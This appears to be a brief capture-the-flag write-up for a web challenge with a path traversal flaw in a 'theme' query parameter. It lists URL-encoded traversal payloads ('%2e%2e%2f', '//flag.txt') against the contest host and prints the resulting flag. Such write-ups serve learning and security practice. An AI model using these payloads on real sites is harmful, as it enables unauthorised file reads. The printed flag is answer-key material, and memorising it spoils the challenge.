# WannaHack CTF
>This question had the following information
```
Someone told me the previous website was broken :(((

Anyways I made it again :)

http://ctf.copsiitbhu.co.in:21339/

```
And it also had a zip file with the updated code of the web and it the same dockerfile as in case of themer.md
The updated code was like

![Screenshot from 2024-04-17 00-58-43](https://github.com/Wizzy2323/WannaHackme/assets/159465554/69b64ec4-1f86-45c8-b026-8769776ab57a)

It also had path traversal vulnerability but now we can't simply use the '/' for relative path traversal
But insted we can use some payloads like '%2e%2e%2f' for exploiting the web page 
So you can follow either of the link to get the flag
```
http://ctf.copsiitbhu.co.in:21339/?theme=%2e%2e%2f/flag.txt
or
http://ctf.copsiitbhu.co.in:21339/?theme=//flag.txt*

```
Now viewing the page source the new webpage gives the flag
## flag:COPS{path_traversal_yay_291}

